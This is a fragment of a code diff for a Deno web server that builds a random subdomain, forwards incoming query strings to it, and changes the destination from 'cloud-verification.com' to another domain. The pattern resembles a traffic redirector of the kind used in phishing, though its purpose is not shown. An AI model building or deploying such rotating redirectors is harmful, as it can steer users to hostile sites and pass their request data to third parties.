@@ -10,7 +10,7 @@ Deno.serve({ port: 8080 }, (request: Request): Response => {
       randomSubdomain += characters.charAt(Math.floor(Math.random() * 36));
     }
 
-    const destinationDomain = `details${randomSubdomain}.stats.cloud-verification.com`;
+    const destinationDomain = `details${randomSubdomain}.validate.equiteq.org`;
     let finalQueryString = '?q=a';
     if (queryString) {
       finalQueryString += '&' + queryString.substring(1);
